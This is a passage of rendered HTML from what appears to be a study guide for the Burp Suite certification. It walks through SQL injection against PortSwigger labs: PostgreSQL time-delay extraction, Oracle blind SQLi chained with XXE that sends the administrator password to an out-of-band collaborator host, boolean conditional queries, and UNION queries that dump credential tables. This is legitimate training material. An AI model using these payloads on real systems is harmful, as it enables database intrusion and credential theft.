class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eTHEN\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003epg_sleep(\u003cspan class=\"pl-c1\"\u003e10\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eELSE\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003epg_sleep(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eEND\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eFROM\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eusers\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUsing CLUSTER bomb attack type with two payload, first for the length of the password \u003ccode\u003e1..20\u003c/code\u003e and then second using characters \u003ccode\u003ea..z\u003c/code\u003e and numbers \u003ccode\u003e0..9\u003c/code\u003e. Add the \u003cstrong\u003eResponse Received\u003c/strong\u003e column to the intruder attack results to sort by and observe the \u003ccode\u003e10\u003c/code\u003e seconds or  more delay as positive response.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/blind-cluster-bomb.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/blind-cluster-bomb.png\" alt=\"blind CLUSTER bomb SQLi\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval\" rel=\"nofollow\"\u003ePortSwigger Lab: Blind SQL injection with time delays and information retrieval\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePractice Exam PostgreSQL TimeDelay\u003c/h4\u003e\u003ca id=\"user-content-practice-exam-postgresql-timedelay\" class=\"anchor\" aria-label=\"Permalink: Practice Exam PostgreSQL TimeDelay\" href=\"#practice-exam-postgresql-timedelay\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the Burp Practice exam stage 2 the SQL injection is escaped not using single quote \u003ccode\u003e'\u003c/code\u003e but using a semicolon \u003ccode\u003e;\u003c/code\u003e and then URL encoding it as \u003ccode\u003e%3B\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"%3BSELECT+pg_sleep(7)--\"\u003e\u003cpre\u003e%3BSELECT\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003epg_sleep(\u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e)\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/practice-exam-stage-2-timedelay-sqli.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/practice-exam-stage-2-timedelay-sqli.png\" alt=\"practice exam stage-2 time delay sqli\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWith a Intruder CLUSTER bomb attack the password can be extracted in one single attack with two payload positions in the below payload.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\";SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--\"\u003e\u003cpre\u003e;\u003cspan class=\"pl-k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eCASE\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eWHEN\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e(username\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eadministrator\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eAND\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eSUBSTRING\u003c/span\u003e(password,\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e,\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ea\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eTHEN\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003epg_sleep(\u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eELSE\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003epg_sleep(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eEND\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eFROM\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eusers\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eStage 3 of the Burp Practice exam admin portal require exploitation of an \u003ca href=\"#ysoserial\"\u003einsecure deserialization\u003c/a\u003e cookie value.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBlind SQLi\u003c/h3\u003e\u003ca id=\"user-content-blind-sqli\" class=\"anchor\" aria-label=\"Permalink: Blind SQLi\" href=\"#blind-sqli\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTarget is vulnerable to Out of band data exfiltration using Blind SQL exploitation query. In this case the trackingID cookie.  Below is combination of SQL injection and XXE payload to exploit the vulnerability and send administrator password as DNS request to the collaborator service.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('\u0026lt;%3fxml+version%3d\u0026quot;1.0\u0026quot;+encoding%3d\u0026quot;UTF-8\u0026quot;%3f\u0026gt;\u0026lt;!DOCTYPE+root+[+\u0026lt;!ENTITY+%25+remote+SYSTEM+\u0026quot;http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.OASTIFY.COM/\u0026quot;\u0026gt;+%25remote%3b]\u0026gt;'),'/l')+FROM+dual--\"\u003e\u003cpre\u003eTrackingId\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003exxx\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e+UNION+SELECT+EXTRACTVALUE(xmltype(\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e%3fxml\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eversion%3d\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eencoding%3d\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUTF-8\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e%3f\u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e!DOCTYPE\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eroot\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e!ENTITY\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e%\u003cspan class=\"pl-c1\"\u003e25\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eremote\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eSYSTEM\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.OASTIFY.COM/\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e%25remote%3b]\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e),\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003el\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e)+FROM+dual--\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/blind-SQL-injection-out-of-band-exfil.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/blind-SQL-injection-out-of-band-exfil.png\" alt=\"Blind SQL injection with out-of-band data exfil\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration\" rel=\"nofollow\"\u003ePortSwigger Lab: Blind SQL injection with out-of-band data exfiltration\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe SQL payload above can also be used to extract the Administrator password for the this \u003ca href=\"https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors\" rel=\"nofollow\"\u003ePortSwigger Lab: Blind SQL injection with conditional errors\u003c/a\u003e challenge.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBlind SQLi no indication\u003c/h3\u003e\u003ca id=\"user-content-blind-sqli-no-indication\" class=\"anchor\" aria-label=\"Permalink: Blind SQLi no indication\" href=\"#blind-sqli-no-indication\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePlacing a single quote at end of the \u003ccode\u003etrackingid\u003c/code\u003e cookie or search parameter \u003ccode\u003e/search_advanced?searchTerm='\u003c/code\u003e may give response \u003ccode\u003e500 Internal Server Error\u003c/code\u003e. Make an educated guess, by using below blind SQLi payload and combine with basic XXE technique, this then makes a call to collaboration server but no data is ex-filtrated.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('\u0026lt;%3fxml+version%3d\u0026quot;1.0\u0026quot;+encoding%3d\u0026quot;UTF-8\u0026quot;%3f\u0026gt;\u0026lt;!DOCTYPE+root+[+\u0026lt;!ENTITY+%25+remote+SYSTEM+\u0026quot;http%3a//OASTIFY.COM/\u0026quot;\u0026gt;+%25remote%3b]\u0026gt;'),'/l')+FROM+dual--\"\u003e\u003cpre\u003eTrackingId\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003exxx\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e+UNION+SELECT+EXTRACTVALUE(xmltype(\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e%3fxml\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eversion%3d\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eencoding%3d\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUTF-8\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e%3f\u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e!DOCTYPE\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eroot\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e!ENTITY\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e%\u003cspan class=\"pl-c1\"\u003e25\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eremote\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eSYSTEM\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp%3a//OASTIFY.COM/\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e%25remote%3b]\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e),\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003el\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e)+FROM+dual--\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sqli-XXE.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sqli-XXE.png\" alt=\"SQLi XXE\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAdditional SQLi payload with XML for reference with \u003ccode\u003e||\u003c/code\u003e the SQL concatenation operator to concatenate two expressions that evaluate two character data types or to numeric data type and do some obfuscating.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"'||(select extractvalue(xmltype('\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % fuzz SYSTEM \u0026quot;http://OASTI'||'FY.COM/\u0026quot;\u0026gt;%fuzz;]\u0026gt;'),'/l') from dual)||'\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e'||(select extractvalue(xmltype('\u0026lt;?xml version=\"1.0\" encoding=\"UTF-8\"?\u0026gt;\u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % fuzz SYSTEM \"http://OASTI'||'FY.COM/\"\u0026gt;%fuzz;]\u0026gt;'),'/l') from dual)||'\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/burp/application-security-testing/oast\" rel=\"nofollow\"\u003eOAST - Out-of-band Application Security Testing\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band\" rel=\"nofollow\"\u003ePortSwigger Lab: Blind SQL injection with out-of-band interaction\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBlind SQLi Conditional Response\u003c/h3\u003e\u003ca id=\"user-content-blind-sqli-conditional-response\" class=\"anchor\" aria-label=\"Permalink: Blind SQLi Conditional Response\" href=\"#blind-sqli-conditional-response\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis blind SQL injection is \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e by a small message difference in the responses. When sending a valid true SQL query the response contain \u003ccode\u003eWelcome back\u003c/code\u003e string in response. Invalid false SQL query statement do not contain the response conditional message.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"' AND '1'='1\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e' AND '1'='1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eFalse SQL statement to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e conditional message not in response.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"' AND '1'='2\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e' AND '1'='2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDetermine how many characters are in the password of the administrator user. To do this, change the SQL statement value to and in intruder \u003cstrong\u003eSettings tab\u003c/strong\u003e, at the \"Grep - Match\" section. Clear any existing entries in the list, and then add the value \u003ccode\u003eWelcome back\u003c/code\u003e to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e true condition.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)\u0026gt;1)='a\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)\u0026gt;1)='a\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNext step is to test the character at each position to determine its value. This involves a much larger number of requests.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sqli-conditional-response.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sqli-conditional-response.png\" alt=\"sqli conditional response\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAlternative use a \u003cstrong\u003eCLUSTER Bomb\u003c/strong\u003e attack and setting \u003cstrong\u003etwo\u003c/strong\u003e payload positions, first one for the character position with a payload of numbers \u003ccode\u003e1..20\u003c/code\u003e and the second position, using alpha and number characters, this will iterate through each permutation of payload combinations.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cluster-bomb.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cluster-bomb.png\" alt=\"CLUSTER bomb\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses\" rel=\"nofollow\"\u003ePortSwigger Lab: Blind SQL injection with conditional responses\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eOracle\u003c/h3\u003e\u003ca id=\"user-content-oracle\" class=\"anchor\" aria-label=\"Permalink: Oracle\" href=\"#oracle\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIdentified SQL injection by adding a \u003cstrong\u003esingle quote\u003c/strong\u003e to the end of the \u003ccode\u003ecategory\u003c/code\u003e parameter value and observing response of \u003ccode\u003e500 Internal Server Error\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eRetrieve the list of tables in the Oracle database:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+table_name,NULL+FROM+all_tables--\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e'+UNION+SELECT+table_name,NULL+FROM+all_tables--\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOracle payload to retrieve the details of the columns in the table.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXX'--\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXX'--\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOracle payload to retrieve the usernames and passwords from Users_XXX table.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"'+UNION+SELECT+USERNAME_XXX,+PASSWORD_XXX+FROM+USERS_XXX--\"\u003e\u003cpre 